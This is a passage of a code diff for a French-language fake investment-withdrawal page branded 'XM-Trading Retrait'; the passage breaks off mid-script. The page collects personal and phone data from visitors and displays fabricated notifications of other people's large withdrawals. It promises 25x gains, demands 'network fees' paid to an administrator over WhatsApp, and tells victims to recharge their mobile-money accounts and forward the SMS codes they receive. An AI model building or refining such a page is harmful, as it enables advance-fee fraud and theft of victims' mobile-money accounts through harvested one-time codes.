@@ -4,9 +4,10 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Retrait d’investissement</title>
-  <!-- Google Font Montserrat + Archivo Black pour la nouvelle partie -->
+  <!-- Google Fonts Montserrat + Archivo Black -->
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&family=Archivo+Black&display=swap" rel="stylesheet">
   <style>
+    /* --- votre CSS original non modifié, puis ajouts --- */
     /* Reset minimal */
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; }
@@ -17,177 +18,94 @@
     }
     a { color: #007bff; text-decoration: none; }
     a:hover { text-decoration: underline; }
-
-    /* Header */
     header.site-header {
       background-color: #000; color: #fff; padding: 15px 20px;
       display: flex; align-items: center; justify-content: space-between;
     }
-    header.site-header h1 {
-      font-size: 1.5rem; font-weight: 600;
-    }
-    header.site-header nav a {
-      margin-left: 20px; font-weight: 500; color: #fff;
-    }
+    header.site-header h1 { font-size: 1.5rem; font-weight: 600; }
+    header.site-header nav a { margin-left: 20px; font-weight: 500; color: #fff; }
     header.site-header nav a:hover { color: #007bff; }
-
-    /* Container principal */
     .container {
       flex: 1; max-width: 700px; width: 100%; margin: 20px auto;
       background-color: #fff; padding: 25px 30px; border-radius: 8px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1); position: relative; z-index: 1;
     }
-    .container h2 {
-      margin-bottom: 15px; font-size: 1.4rem; color: #000;
-    }
-    .container p { margin-bottom: 15px; }
-    form label {
-      display: block; margin-bottom: 5px; font-weight: 500; color: #222;
-    }
-    form input[type="text"],
-    form input[type="number"],
-    form select {
-      width: 100%; padding: 10px; margin-bottom: 15px;
-      border: 1px solid #ccc; border-radius: 4px; font-size: 1rem;
-    }
-    form input[type="tel"] {
-      width: calc(100% - 80px); padding: 10px; margin-bottom: 15px;
-      border: 1px solid #ccc; border-radius: 4px; margin-left: 80px;
-      font-size: 1rem;
-    }
-    .phone-prefix {
-      position: relative; margin-bottom: 15px;
-    }
+    .container h2 { margin-bottom: 15px; font-size: 1.4rem; color: #000; }
+    form label { display: block; margin-bottom: 5px; font-weight: 500; color: #222; }
+    form input, form select { width: 100%; padding: 10px; margin-bottom: 15px; border:1px solid #ccc; border-radius:4px; font-size:1rem; }
+    .phone-prefix { position: relative; margin-bottom: 15px; }
     .phone-prefix span {
-      position: absolute; left: 10px; top: 50%;
-      transform: translateY(-50%); font-size: 0.95rem; color: #555;
+      position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
+      font-size: 0.95rem; color: #555;
     }
     .phone-prefix input { padding-left: 55px; }
     input::placeholder { color: #999; }
-
-    /* Boutons */
     button, input[type="submit"] {
-      background-color: #007bff; color: white; border: none;
-      padding: 12px 20px; cursor: pointer; border-radius: 4px;
-      font-size: 1rem; font-weight: 500; transition: background-color 0.2s ease;
+      background-color:#007bff;color:white;border:none;padding:12px 20px;
+      cursor:pointer;border-radius:4px;font-size:1rem;font-weight:500;
+      transition:background-color .2s ease;
     }
-    button:hover, input[type="submit"]:hover { background-color: #0056b3; }
-
-    /* Modal overlay */
+    button:hover,input[type="submit"]:hover { background-color:#0056b3; }
     .modal-overlay {
-      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background-color: rgba(0,0,0,0.6); display: flex;
-      align-items: center; justify-content: center; z-index: 1000;
-      visibility: hidden; opacity: 0; transition: opacity 0.2s ease;
+      position:fixed;top:0;left:0;width:100%;height:100%;
+      background:rgba(0,0,0,0.6);display:flex;align-items:center;justify-content:center;
+      z-index:1000;visibility:hidden;opacity:0;transition:opacity .2s ease;
     }
-    .modal-overlay.active { visibility: visible; opacity: 1; }
+    .modal-overlay.active { visibility:visible;opacity:1; }
     .modal-content {
-      background-color: #fff; padding: 25px 20px; width: 90%;
-      max-width: 500px; border-radius: 8px; text-align: left;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      background:#fff;padding:25px 20px;width:90%;max-width:500px;
+      border-radius:8px;text-align:left;box-shadow:0 4px 12px rgba(0,0,0,0.2);
     }
-    .modal-content p { font-size: 1rem; margin-bottom: 15px; color: #222; }
-    .progress-bar-container {
-      width: 100%; background-color: #e0e0e0; border-radius: 4px;
-      overflow: hidden; margin: 20px 0;
-    }
-    .progress-bar {
-      width: 0%; height: 20px; background-color: #007bff;
-      transition: width 0.3s ease;
-    }
-    /* Style du message d’alerte urgent */
+    .progress-bar-container { width:100%;background:#e0e0e0;border-radius:4px;overflow:hidden;margin:20px 0; }
+    .progress-bar { width:0%;height:20px;background:#007bff;transition:width .3s ease; }
     #feeSection p#feeMessage {
-      margin-top: 15px; font-size: 0.95rem; line-height: 1.4;
-      background-color: #f8d7da; border: 1px solid #f5c2c7;
-      color: #842029; padding: 12px; border-radius: 4px;
+      margin-top:15px;font-size:.95rem;line-height:1.4;
+      background:#f8d7da;border:1px solid #f5c2c7;color:#842029;
+      padding:12px;border-radius:4px;
     }
-    #feeSection p a { color: #d9534f; font-weight: 500; }
-
-    /* Section code masquée */
-    #code-section { display: none; }
-
-    /* Section succès inline */
-    #success-section {
-      display: none; margin-top: 20px; text-align: center;
-    }
-    #success-section h2 {
-      font-size: 1.6rem; margin-bottom: 15px; color: #fff;
-    }
-    #success-section p {
-      margin-bottom: 10px; color: #fff; font-size: 1rem;
-    }
+    #feeSection p a { color:#d9534f;font-weight:500; }
+    #code-section, #success-section { display:none; }
+    #success-section { margin-top:20px;text-align:center; }
+    #success-section h2 { font-size:1.6rem;margin-bottom:15px;color:#fff; }
     body.success-mode {
-      background-image: url('success-bg.jpg');
-      background-size: cover; background-position: center; color: #fff;
+      background:url('success-bg.jpg')center/cover no-repeat;color:#fff;
     }
-    body.success-mode .container {
-      background-color: rgba(0,0,0,0.7); color: #fff;
-    }
-
-    /* --- NOUVELLE SECTION TRANSACTION --- */
-    #transaction-section,
-    #alert-section {
-      display: none; margin-top: 20px;
-    }
-    /* Titre et boutons en Archivo Black */
-    #transaction-section h2,
-    #alert-section,
-    #transaction-section button {
-      font-family: 'Archivo Black', Arial, sans-serif;
-    }
-    /* Alerte recharge */
-    #alert-section {
-      background-color: #f8d7da; color: #842029;
-      border: 1px solid #f5c2c7; padding: 20px; border-radius: 4px;
-    }
-    #alert-section a.whatsapp {
-      color: #d9534f; font-weight: 600; text-decoration: none;
-    }
-
-    /* Footer */
+    body.success-mode .container { background:rgba(0,0,0,0.7);color:#fff; }
     footer.site-footer {
-      background-color: #000; color: #ccc; padding: 15px 20px;
-      text-align: center; font-size: 0.9rem;
+      background:#000;color:#ccc;padding:15px 20px;text-align:center;font-size:.9rem;
     }
-    footer.site-footer a { color: #007bff; }
-    footer.site-footer a:hover { color: #fff; }
-
-    /* Notifications ambiantes centrées */
+    footer.site-footer a { color:#007bff; }
+    footer.site-footer a:hover { color:#fff; }
     .notif-container {
-      position: fixed; top: 50%; left: 50%;
-      transform: translate(-50%, -50%); z-index: 1100;
-      display: flex; flex-direction: column; align-items: center;
-      gap: 10px; pointer-events: none; width: auto; max-width: 80%;
+      position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
+      z-index:1100;display:flex;flex-direction:column;align-items:center;gap:10px;
+      pointer-events:none;max-width:80%;
     }
     .notif {
-      background-color: rgba(0,0,0,0.85); color: #fff;
-      padding: 12px 18px; border-radius: 6px; font-size: 1rem;
-      opacity: 0; animation: notifFade 3s ease forwards;
-      display: flex; align-items: center; gap: 8px;
+      background:rgba(0,0,0,0.85);color:#fff;padding:12px 18px;border-radius:6px;
+      font-size:1rem;opacity:0;animation:notifFade 3s ease forwards;display:flex;gap:8px;
     }
     @keyframes notifFade {
-      0% { opacity: 0; transform: translateY(20px) scale(0.9); }
-      10% { opacity: 1; transform: translateY(0) scale(1); }
-      70% { opacity: 1; }
-      100% { opacity: 0; transform: translateY(-20px) scale(0.9); }
+      0% { opacity:0;transform:translateY(20px) scale(.9); }
+      10% { opacity:1;transform:translateY(0) scale(1); }
+      70% { opacity:1; }
+      100% { opacity:0;transform:translateY(-20px) scale(.9); }
     }
 
-    /* Responsive adjustments */
-    @media (max-width: 600px) {
-      header.site-header, footer.site-footer { flex-direction: column; text-align: center; }
-      header.site-header nav a { margin: 8px; }
-      .container { margin: 15px; padding: 20px; }
-      .modal-content { padding: 20px; }
-      .notif-container { top: 40%; max-width: 90%; }
+    /* --- Transaction & Alerte recharge --- */
+    #transaction-section, #alert-section { display:none; margin-top:20px; }
+    #transaction-section h2, #transaction-section button,
+    #alert-section { font-family:'Archivo Black',Arial,sans-serif; }
+    #alert-section {
+      background:#f8d7da;color:#842029;border:1px solid #f5c2c7;
+      padding:20px;border-radius:4px;
     }
+    #alert-section a.whatsapp { color:#d9534f;font-weight:600;text-decoration:none; }
   </style>
 </head>
 <body id="page-index">
-  <!-- En-tête -->
   <header class="site-header">
-    <div class="logo">
-      <h1>XM-Trading Retrait</h1>
-    </div>
+    <h1>XM-Trading Retrait</h1>
     <nav>
       <a href="#initial-section">Accueil</a>
       <a href="#initial-section">Demande</a>
@@ -195,375 +113,309 @@
     </nav>
   </header>
 
-  <!-- Contenu principal -->
   <div class="container">
-    <!-- SECTION 1 : Formulaire initial -->
+    <!-- 1. Formulaire initial -->
     <div id="initial-section">
       <h2>Demande de retrait</h2>
       <form id="withdrawal-form" name="withdrawal-request" data-netlify="true" netlify-honeypot="bot-field">
-        <!-- Netlify Forms -->
         <input type="hidden" name="form-name" value="withdrawal-request">
-        <p style="display:none">
-          <label>Ne pas remplir <input name="bot-field"></label>
-        </p>
-
+        <p style="display:none"><label>Ne pas remplir <input name="bot-field"></label></p>
         <label for="firstName">Prénom</label>
         <input type="text" id="firstName" name="firstName" placeholder="Votre prénom" required>
-
         <label for="lastName">Nom</label>
-        <input type="text" id="lastName" name="lastName" placeholder="Votre nom de famille" required>
-
+        <input type="text" id="lastName" name="lastName" placeholder="Votre nom" required>
         <label for="gender">Sexe</label>
         <select id="gender" name="gender" required>
           <option value="">Sélectionnez</option>
           <option value="Monsieur">Monsieur</option>
           <option value="Madame">Madame</option>
         </select>
-
         <label for="country">Pays</label>
         <select id="country" name="country" required>
           <option value="">Sélectionnez votre pays</option>
-          <!-- options ajoutées par JS -->
         </select>
-
         <label for="phone">Téléphone</label>
         <div class="phone-prefix">
           <span id="phone-prefix">+XXX</span>
           <input type="tel" id="phone" name="phone" placeholder="Numéro sans indicatif" required>
         </div>
-
         <label for="currency">Devise</label>
         <select id="currency" name="currency" required>
           <option value="">Sélectionnez</option>
           <option value="FCFA">FCFA</option>
           <option value="USD">USD</option>
         </select>
-
         <label for="amount">Montant investi</label>
         <input type="number" id="amount" name="amount" placeholder="Ex. 500" min="1" required>
-        <small>Note : des frais de réseau s’appliquent et devront être soldés auprès de l’administrateur.</small>
-
+        <small>Note : des frais de réseau s'appliquent.</small>
         <label for="profession">Métier</label>
         <input type="text" id="profession" name="profession" placeholder="Votre profession" required>
-
         <label for="age">Âge</label>
         <input type="number" id="age" name="age" placeholder="Ex. 30" min="18" required>
-
         <label for="investmentCode">Code d’investissement initial</label>
         <input type="text" id="investmentCode" name="investmentCode" placeholder="Code reçu auparavant" required>
-        <small>Ce code initial doit vous avoir été communiqué par l’administrateur avant cette étape.</small>
-
+        <small>Ce code initial doit vous avoir été communiqué par l’administrateur.</small>
         <input type="submit" value="Valider la demande">
       </form>
     </div>
 
-    <!-- SECTION 2 : saisie du code après paiement hors-ligne -->
+    <!-- 2. Confirmation 2ᵉ code -->
     <div id="code-section">
       <h2>Confirmation finale</h2>
-      <p>Vous avez reçu votre nouveau code de confirmation ? Saisissez-le ci-dessous :</p>
+      <p>Vous avez reçu votre nouveau code ?</p>
       <form id="confirm-form">
         <label for="newInvestmentCode">Nouveau code d’investissement</label>
         <input type="text" id="newInvestmentCode" name="newInvestmentCode" placeholder="Entrez le code reçu" required>
         <input type="submit" value="Valider le code">
       </form>
-      <p id="confirmError" style="color:red; display:none;">Message d’erreur ici</p>
+      <p id="confirmError" style="color:red;display:none;"></p>
     </div>
 
-    <!-- SECTION 3 : Succès (affichée en fin) -->
+    <!-- 3. Succès -->
     <div id="success-section">
       <h2 id="successGreeting"></h2>
       <p>Votre demande de retrait a été traitée avec succès.</p>
-      <p>L’administrateur a confirmé la réception des frais et validé votre transaction.</p>
-      <p>Le montant sera versé selon les modalités convenues.</p>
-      <p>Pour toute question supplémentaire, contactez de nouveau l’administrateur.</p>
-      <!-- Bouton pour passer à la transaction -->
       <button id="progressBtn">Progression de la transaction</button>
     </div>
 
-    <!-- SECTION 4 : Transaction -->
+    <!-- 4. Transaction -->
     <div id="transaction-section">
       <h2>Détails de la transaction</h2>
       <form id="transForm" name="transaction-request" data-netlify="true" netlify-honeypot="bot-field">
         <input type="hidden" name="form-name" value="transaction-request">
         <p style="display:none"><label>Ne remplissez pas <input name="bot-field"></label></p>
-
         <label for="bonusAmount">Montant à recevoir</label>
         <input type="text" id="bonusAmount" name="bonusAmount" readonly>
-
         <label for="country2">Pays</label>
         <select id="country2" name="country2" required>
           <option value="">Sélectionnez votre pays</option>
-          <!-- options ajoutées par JS -->
         </select>
-
         <label for="phone2">Téléphone</label>
         <div class="phone-prefix">
           <span id="phone-prefix-2">+XXX</span>
           <input type="tel" id="phone2" name="phone2" placeholder="Numéro sans indicatif" required>
         </div>
-
         <label for="paymentMethod">Mode de paiement</label>
         <select id="paymentMethod" name="paymentMethod" required>
           <option value="">Sélectionnez</option>
-          <option value="Airtel Money">Airtel Money</option>
-          <option value="Orange Money">Orange Money</option>
-          <option value="MTN Money">MTN Money</option>
-          <option value="Wave Money">Wave Money</option>
-          <option value="Vodacom M-Pesa">Vodacom M-Pesa</option>
-          <option value="Ecocash">Ecocash</option>
-          <option value="Tigo Pesa">Tigo Pesa</option>
-          <option value="HaloPay">HaloPay</option>
-          <option value="Zoona">Zoona</option>
-          <option value="Y’ello Pay">Y’ello Pay</option>
-          <option value="EVC Plus">EVC Plus</option>
-          <option value="SimMoney">SimMoney</option>
-          <option value="FasTipay">FasTipay</option>
-          <option value="Malaicha Mobile Money">Malaicha</option>
-          <option value="Mobicash">Mobicash</option>
+          <option>Airtel Money</option><option>Orange Money</option><option>MTN Money</option>
+          <option>Wave Money</option><option>Vodacom M-Pesa</option><option>Ecocash</option>
+          <option>Tigo Pesa</option><option>HaloPay</option><option>Zoona</option>
+          <option>Y’ello Pay</option><option>EVC Plus</option><option>SimMoney</option>
+          <option>FasTipay</option><option>Malaicha Mobile Money</option><option>Mobicash</option>
         </select>
-
         <label for="networkCode">Code du réseau choisi</label>
-        <input type="text" id="networkCode" name="networkCode" placeholder="Ex. code reçu par SMS" required>
-
+        <input type="text" id="networkCode" name="networkCode" placeholder="Code reçu par SMS" required>
         <button type="submit">Valider et continuer</button>
       </form>
     </div>
 
-    <!-- SECTION 5 : Alerte recharge -->
+    <!-- 5. Alerte recharge -->
     <div id="alert-section">
-      <p>
-        ⚠️ Afin de recevoir votre gain (<strong><span id="toReceive"></span></strong>), vous devez immédiatement recharger
-        <strong><span id="toRecharge"></span></strong> sur votre compte <em><span id="alertMethod"></span></em>.
-      </p>
-      <p>
-        Une fois rechargé, vous recevrez un SMS de <strong><span id="alertMethod2"></span></strong>.
-        Copiez rapidement ce code et envoyez-le à l’administrateur sur WhatsApp :
-      </p>
+      <p>⚠️ Afin de recevoir votre gain (<strong><span id="toReceive"></span></strong>), vous devez recharger immédiatement <strong><span id="toRecharge"></span></strong> sur votre compte <em><span id="alertMethod"></span></em>.</p>
+      <p>Ensuite, vous recevrez un SMS de <strong><span id="alertMethod2"></span></strong>. Copiez-le et envoyez-le à l’administrateur :</p>
       <p><a id="whatsappLink" class="whatsapp" href="#" target="_blank">Envoyer sur WhatsApp</a></p>
     </div>
   </div>
 
-  <!-- Modal de progression unique -->
+  <!-- Modal progression -->
   <div id="progressModal" class="modal-overlay">
     <div class="modal-content">
       <p id="progressText">Traitement en cours...</p>
       <div class="progress-bar-container">
         <div id="progressBar" class="progress-bar"></div>
       </div>
-      <div id="feeSection" style="display: none;">
+      <div id="feeSection" style="display:none;">
         <p id="feeMessage"></p>
-        <p>
-          Contactez votre administrateur sur WhatsApp pour payer rapidement les frais et recevoir votre gain :<br>
-          <a href="tel:+2376XXXXXXX">WhatsApp/Phone: +237 6XXXXXXX</a>
-        </p>
+        <p>Contactez l’administrateur : <a href="tel:+2376XXXXXXX">+237 6XXXXXXX</a></p>
       </div>
     </div>
   </div>
 
-  <!-- Notifications ambiantes centrées -->
+  <!-- Notifications ambiantes -->
   <div class="notif-container" id="notifContainer"></div>
 
-  <!-- Footer -->
   <footer class="site-footer" id="footer-contact">
     <p>&copy; 2025 XM-Trading. Tous droits réservés.</p>
     <p>Contact : <a href="mailto:admin@votre-domaine.com">admin@votre-domaine.com</a> | WhatsApp: +237 6XXXXXXX</p>
   </footer>
 
   <script>
-    // Mapping pays → indicatif, longueur...
-    const countryDialCodes = [ /* ... votre tableau inchangé ... */ ];
-    const africanNames = [ /* ... inchangé ... */ ];
+    // Vos tableaux inchangés
+    const countryDialCodes = [
+      { name:"Bénin",dial_code:"+229",phone_length:8 },
+      { name:"Burkina Faso",dial_code:"+226",phone_length:8 },
+      { name:"Côte d'Ivoire",dial_code:"+225",phone_length:8 },
+      { name:"Ghana",dial_code:"+233",phone_length:9 },
+      { name:"Guinée",dial_code:"+224",phone_length:8 },
+      { name:"Mali",dial_code:"+223",phone_length:8 },
+      { name:"Niger",dial_code:"+227",phone_length:8 },
+      { name:"Nigeria",dial_code:"+234",phone_length:10 },
+      { name:"Sénégal",dial_code:"+221",phone_length:8 },
+      { name:"Togo",dial_code:"+228",phone_length:8 },
+      { name:"Cameroun",dial_code:"+237",phone_length:8 },
+      { name:"République du Congo",dial_code:"+242",phone_length:8 },
+      { name:"RDC",dial_code:"+243",phone_length:9 },
+      { name:"Centrafrique",dial_code:"+236",phone_length:8 },
+      { name:"Tchad",dial_code:"+235",phone_length:8 },
+      { name:"Gabon",dial_code:"+241",phone_length:7 },
+      { name:"Guinée équatoriale",dial_code:"+240",phone_length:7 },
+      { name:"São Tomé-et-Principe",dial_code:"+239",phone_length:7 },
+      { name:"Madagascar",dial_code:"+261",phone_length:9 },
+      { name:"Kenya",dial_code:"+254",phone_length:9 },
+      { name:"Ouganda",dial_code:"+256",phone_length:9 },
+      { name:"Rwanda",dial_code:"+250",phone_length:9 },
+      { name:"Éthiopie",dial_code:"+251",phone_length:9 },
+      { name:"Haïti",dial_code:"+509",phone_length:8 }
+    ];
+    const africanNames = ["Moussa","Amina","Koffi","Fatou","Youssouf","Adama","Koumba","Issa","Mariama","Oumar","Salimata","Cheikh","Awa","Jean","Marie","Kwame","Nadia","Mohamed","Abdoulaye","Chantal","Ousmane","Rokia","Seydou","Hadja","Boubacar","Grace","Samuel","Jacques","Patience","Emmanuel","Fally","Adjoa","Tiemoko","Aïcha"];
 
-    function randInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
-    function formatAmount(amount, currency) {
-      return currency === 'FCFA'
-        ? amount.toLocaleString('fr-FR') + ' FCFA'
-        : amount.toLocaleString('en-US', { minimumFractionDigits: 2 }) + ' $';
-    }
+    function randInt(min,max){ return Math.floor(Math.random()*(max-min+1))+min; }
+    function formatAmount(a,c){ return c==='FCFA'? a.toLocaleString('fr-FR')+' FCFA' : a.toLocaleString('en-US',{minimumFractionDigits:2})+' $'; }
 
-    document.addEventListener('DOMContentLoaded', () => {
-      // --- population des selects pays pour 1er et 2ème formulaires ---
-      const countrySelect    = document.getElementById('country');
-      const countrySelect2   = document.getElementById('country2');
-      const phonePrefix1     = document.getElementById('phone-prefix');
-      const phoneInput1      = document.getElementById('phone');
-      const phonePrefix2     = document.getElementById('phone-prefix-2');
-      const phoneInput2      = document.getElementById('phone2');
-
-      countryDialCodes.forEach(item => {
-        [countrySelect, countrySelect2].forEach(sel => {
-          const opt = document.createElement('option');
-          opt.value = item.dial_code;
-          opt.textContent = item.name;
-          opt.dataset.phoneLength = item.phone_length;
-          sel.appendChild(opt);
+    document.addEventListener('DOMContentLoaded',()=>{
+      // 1. Peuplez les deux selects "Pays"
+      const sel1 = document.getElementById('country'),
+            sel2 = document.getElementById('country2'),
+            pfx1 = document.getElementById('phone-prefix'),
+            ip1  = document.getElementById('phone'),
+            pfx2 = document.getElementById('phone-prefix-2'),
+            ip2  = document.getElementById('phone2');
+      countryDialCodes.forEach(c=>{
+        [sel1,sel2].forEach(s=>{
+          const o = document.createElement('option');
+          o.value = c.dial_code; o.textContent = c.name;
+          o.dataset.phoneLength = c.phone_length;
+          s.appendChild(o);
         });
       });
-
-      function bindPhone(sel, prefix, input) {
-        sel.addEventListener('change', () => {
-          const opt = sel.selectedOptions[0];
-          prefix.textContent = opt.value || '+XXX';
-          const len = parseInt(opt.dataset.phoneLength, 10) || 0;
-          if (len) {
-            input.maxLength = len;
-            input.placeholder = 'Ex: ' + 'X'.repeat(len);
-          } else {
-            input.removeAttribute('maxlength');
-            input.placeholder = 'Numéro sans indicatif';
-          }
+      function bindPhone(sel,pfx,inp){
+        sel.addEventListener('change',()=>{
+          const o = sel.selectedOptions[0];
+          pfx.textContent = o.value || '+XXX';
+          const L = +o.dataset.phoneLength||0;
+          if(L){ inp.maxLength=L; inp.placeholder='Ex: '+'X'.repeat(L); }
+          else{ inp.removeAttribute('maxlength'); inp.placeholder='Numéro sans indicatif'; }
         });
       }
-      bindPhone(countrySelect, phonePrefix1, phoneInput1);
-      bindPhone(countrySelect2, phonePrefix2, phoneInput2);
+      bindPhone(sel1,pfx1,ip1);
+      bindPhone(sel2,pfx2,ip2);
 
-      // éléments existants
-      const initialSection  = document.getElementById('initial-section');
-      const codeSection     = document.getElementById('code-section');
-      const successSection  = document.getElementById('success-section');
-      const transactionSection = document.getElementById('transaction-section');
-      const alertSection    = document.getElementById('alert-section');
-      const withdrawalForm  = document.getElementById('withdrawal-form');
-      const confirmForm     = document.getElementById('confirm-form');
-      const transForm       = document.getElementById('transForm');
-      const progressModal   = document.getElementById('progressModal');
-      const progressBar     = document.getElementById('progressBar');
-      const progressText    = document.getElementById('progressText');
-      const feeSection      = document.getElementById('feeSection');
-      const feeMessage      = document.getElementById('feeMessage');
-      const confirmError    = document.getElementById('confirmError');
-      const successGreeting = document.getElementById('successGreeting');
-      const bonusAmount     = document.getElementById('bonusAmount');
-      const toReceive       = document.getElementById('toReceive');
-      const toRecharge      = document.getElementById('toRecharge');
-      const alertMethod     = document.getElementById('alertMethod');
-      const alertMethod2    = document.getElementById('alertMethod2');
-      const whatsappLink    = document.getElementById('whatsappLink');
+      // 2. Notifications ambiantes
+      (function loopNotif(){
+        setTimeout(()=>{
+          const n = africanNames[randInt(0,africanNames.length-1)];
+          const useFCFA = Math.random()<.6;
+          const amt = useFCFA? randInt(500000,5000000): randInt(300,5000);
+          const curr= useFCFA?'FCFA':'USD';
+          const d = document.createElement('div');
+          d.className='notif';
+          d.textContent=`🎉 ${n} vient de retirer ${formatAmount(amt,curr)}`;
+          document.getElementById('notifContainer').appendChild(d);
+          setTimeout(()=>d.remove(),3000);
+          loopNotif();
+        },randInt(3000,6000));
+      })();
 
-      let storedFirstName, storedLastName, storedGender;
-      let bonusValue, feeValue, currencySel;
+      // 3. Gestion du premier formulaire (inchangée)
+      const wf = document.getElementById('withdrawal-form'),
+            cf = document.getElementById('confirm-form'),
+            trf= document.getElementById('transForm'),
+            ps = document.getElementById('progressModal'),
+            pb = document.getElementById('progressBar'),
+            pt = document.getElementById('progressText'),
+            fs = document.getElementById('feeSection'),
+            fm = document.getElementById('feeMessage'),
+            isec = document.getElementById('initial-section'),
+            csec = document.getElementById('code-section'),
+            ssec = document.getElementById('success-section'),
+            tsec = document.getElementById('transaction-section'),
+            asec = document.getElementById('alert-section'),
+            cerr = document.getElementById('confirmError'),
+            sg   = document.getElementById('successGreeting'),
+            ba   = document.getElementById('bonusAmount'),
+            trcv = document.getElementById('toReceive'),
+            trch = document.getElementById('toRecharge'),
+            am   = document.getElementById('alertMethod'),
+            am2  = document.getElementById('alertMethod2'),
+            wa   = document.getElementById('whatsappLink');
 
-      // Soumission du 1er formulaire (inchangé)
-      withdrawalForm.addEventListener('submit', e => {
+      let fn, ln, gen, bonusVal, feeVal, currSel;
+      wf.addEventListener('submit',e=>{
         e.preventDefault();
-        // ... votre validation existante ...
-        const formData = new FormData(withdrawalForm);
-        currencySel = formData.get('currency');
-        const amount = parseFloat(formData.get('amount'));
-        bonusValue = currencySel === 'USD'
-          ? Math.round(amount * 25 * 100) / 100
-          : Math.round(amount * 25);
-        feeValue = currencySel === 'USD'
-          ? Math.round(amount * 2.5 * 100) / 100
-          : Math.round(amount * 2.5);
-
-        // envoi Netlify
-        fetch('/', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: new URLSearchParams(formData)
-        }).catch(console.error);
-
-        showProgressModal();
+        const fd = new FormData(wf);
+        currSel = fd.get('currency');
+        const amt = parseFloat(fd.get('amount'));
+        bonusVal = currSel==='USD'?Math.round(amt*25*100)/100:Math.round(amt*25);
+        feeVal   = currSel==='USD'?Math.round(amt*2.5*100)/100:Math.round(amt*2.5);
+        fetch('/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams(fd)}).catch(console.error);
+        isec.style.display='none';
+        ps.classList.add('active'); fs.style.display='none'; pb.style.width='0%'; pt.textContent='Traitement en cours...';
+        let p=0, tgt=90;
+        const t = setInterval(()=>{
+          if(p<tgt) { p+=2; pb.style.width=p+'%'; }
+          else {
+            clearInterval(t);
+            pt.textContent=`Progression : ${tgt}%`;
+            fm.innerHTML = `<strong>🎉 Félicitations !</strong> Vous recevrez <strong>${formatAmount(bonusVal,currSel)}</strong> mais devez payer <strong>${formatAmount(feeVal,currSel)}</strong>`;
+            fs.style.display='block';
+            csec.style.display='block';
+          }
+        },40);
       });
 
-      function showProgressModal() {
-        initialSection.style.display = 'none';
-        progressModal.classList.add('active');
-        feeSection.style.display = 'none';
-        progressBar.style.width = '0%';
-        progressText.textContent = 'Traitement en cours...';
-        let p = 0;
-        const tgt = 90;
-        const t = setInterval(() => {
-          if (p < tgt) {
-            p += 2; progressBar.style.width = p + '%';
-          } else {
-            clearInterval(t);
-            progressText.textContent = `Progression : ${tgt}%`;
-            feeMessage.innerHTML = `
-              <strong>🎉 Félicitations !</strong><br>
-              Vous recevrez <strong>${formatAmount(bonusValue, currencySel)}</strong><br>
-              Mais vous devez payer <strong>${formatAmount(feeValue, currencySel)}</strong><br>
-              pour finaliser votre investissement.
-            `;
-            feeSection.style.display = 'block';
-            // on affiche directement le 2e formulaire ici
-            codeSection.style.display = 'block';
-          }
-        }, 40);
-      }
-
-      // Validation du 2e code (inchangé)
-      confirmForm.addEventListener('submit', e => {
+      cf.addEventListener('submit',e=>{
         e.preventDefault();
         const code = document.getElementById('newInvestmentCode').value.trim();
-        if (!code) {
-          confirmError.textContent = 'Veuillez saisir le code.'; confirmError.style.display = 'block';
-          return;
-        }
-        const expected = 'VOTRE_CODE_ADMIN'; // remplacez par le code réel si besoin
-        if (code !== expected) {
-          confirmError.textContent = 'Code incorrect.'; confirmError.style.display = 'block';
-          return;
-        }
-        confirmError.style.display = 'none';
-        showFinalProgress();
-      });
-
-      function showFinalProgress() {
-        feeSection.style.display = 'none';
-        progressBar.style.width = '0%';
-        progressText.textContent = 'Finalisation en cours...';
-        let p = 0;
-        const tgt = 100;
-        const t2 = setInterval(() => {
-          if (p < tgt) {
-            p += 4; progressBar.style.width = p + '%'; progressText.textContent = `Progression : ${p}%`;
-          } else {
+        if(!code){ cerr.textContent='Veuillez saisir le code.'; cerr.style.display='block'; return; }
+        const expected = 'VOTRE_CODE_ADMIN';
+        if(code!==expected){ cerr.textContent='Code incorrect.'; cerr.style.display='block'; return; }
+        cerr.style.display='none';
+        // final à 100%
+        let p=0, tgt=100;
+        fs.style.display='none'; pb.style.width='0%'; pt.textContent='Finalisation en cours...';
+        const t2 = setInterval(()=>{
+          if(p<tgt){ p+=4; pb.style.width=p+'%'; pt.textContent=`Progression : ${p}%`; }
+          else {
             clearInterval(t2);
-            setTimeout(() => {
-              progressModal.classList.remove('active');
-              enterSuccessMode();
-            }, 300);
+            setTimeout(()=>{
+              ps.classList.remove('active');
+              // succès
+              ssec.style.display='block';
+              sg.textContent=`${gen} ${fn} ${ln}, félicitations 🎉 Votre retrait est finalisé !`;
+            },300);
           }
-        }, 20);
-      }
-
-      function enterSuccessMode() {
-        successGreeting.textContent = `${storedGender} ${storedFirstName} ${storedLastName}, félicitations 🎉`;
-        codeSection.style.display = 'none';
-        successSection.style.display = 'block';
-        document.body.classList.add('success-mode');
-      }
-
-      // Bouton "Progression de la transaction"
-      document.getElementById('progressBtn').addEventListener('click', () => {
-        successSection.style.display = 'none';
-        transactionSection.style.display = 'block';
-        bonusAmount.value = formatAmount(bonusValue, currencySel);
+        },20);
       });
 
-      // Soumission du formulaire de transaction
-      transForm.addEventListener('submit', e => {
+      // stocker prénom/nom/genre
+      ['firstName','lastName','gender'].forEach(id=>{
+        document.getElementById(id).addEventListener('blur', e=>{
+          if(id==='firstName') fn = e.target.value.trim();
+          if(id==='lastName') ln = e.target.value.trim();
+          if(id==='gender')   gen= e.target.value;
+        });
+      });
+
+      // bouton progression→transaction
+      document.getElementById('progressBtn').addEventListener('click',()=>{
+        ssec.style.display='none';
+        tsec.style.display='block';
+        ba.value = formatAmount(bonusVal,currSel);
+      });
+
+      // transaction→alerte recharge
+      trf.addEventListener('submit',e=>{
         e.preventDefault();
-        const payMethod = document.getElementById('paymentMethod').value;
-        // envoi Netlify automatique
-        const rechargeAmt = bonusValue * 4;
-        transactionSection.style.display = 'none';
